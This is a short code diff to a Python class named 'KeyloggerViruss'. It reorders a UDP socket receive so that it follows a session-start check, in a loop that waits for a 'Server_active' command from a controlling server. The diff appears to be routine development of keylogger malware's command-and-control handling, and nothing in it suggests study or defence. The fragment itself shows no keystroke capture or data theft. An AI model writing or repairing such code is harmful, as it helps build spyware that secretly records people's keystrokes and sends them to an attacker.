@@ -93,11 +93,12 @@ class KeyloggerViruss():
         try:
             while True:
                 try:
-                    data, _ = sock.recvfrom(buffer_size)
-                    data = json.loads(data.decode())
                     if not self.is_active_server:
                         self.start_session()
                         time.sleep(0.1)
+
+                    data, _ = sock.recvfrom(buffer_size)
+                    data = json.loads(data.decode())
 
                     if data.get("command", "") == "Server_active":
                         self.is_active_server = True
